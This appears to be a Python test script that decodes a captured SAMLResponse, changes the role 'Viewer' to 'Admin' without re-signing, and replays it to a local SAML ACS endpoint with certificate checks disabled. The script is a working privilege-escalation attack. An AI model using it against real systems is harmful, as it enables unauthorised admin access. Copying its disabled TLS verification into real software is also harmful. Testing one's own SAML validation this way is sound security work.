import base64, re, ssl, sys, urllib.parse, urllib.request, urllib.error

mode = sys.argv[1] if len(sys.argv) > 1 else "tamper"   # tamper | replay
raw = open("tools/captured_response.txt").read()
m = re.search(r"SAMLResponse=([^&\s'\"]*)", raw)
val = m.group(1) if m else raw.strip()
b64 = urllib.parse.unquote(val).replace(" ", "+").strip()
b64 += "=" * (-len(b64) % 4)
xml = base64.b64decode(b64).decode("utf-8", errors="replace")
print("Captured XML length:", len(xml))
if not xml.rstrip().endswith("Response>"):
    sys.exit("The captured text is truncated. Copy it again from DevTools.")

if mode == "tamper":
    new_xml = xml.replace(">Viewer<", ">Admin<")
    print("Role value changed in XML:", new_xml != xml)
    b64 = base64.b64encode(new_xml.encode("utf-8")).decode()

data = urllib.parse.urlencode({"SAMLResponse": b64}).encode()
ctx = ssl._create_unverified_context()
try:
    r = urllib.request.urlopen("https://localhost:5443/saml/acs", data=data, context=ctx)
    print("HTTP", r.status)
except urllib.error.HTTPError as e:
    print("HTTP", e.code)
    print(e.read().decode()[:600])
